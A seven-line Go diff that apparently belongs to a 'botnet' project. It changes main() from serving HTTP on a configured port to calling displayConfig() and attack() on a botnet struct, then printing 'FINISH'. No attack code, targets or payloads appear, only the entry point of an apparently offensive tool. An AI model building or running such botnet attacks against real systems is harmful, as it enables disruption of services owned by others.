@@ -1,7 +1,11 @@
 package main
 
+import "fmt"
+
 func main() {
-	bot := botnet{}
+	bot := &botnet{}
 	bot.init()
-	log.Fatal(http.ListenAndServe(":"+bot.serverPort, nil))
+	bot.displayConfig()
+	bot.attack()
+	fmt.Println("FINISH")
 }
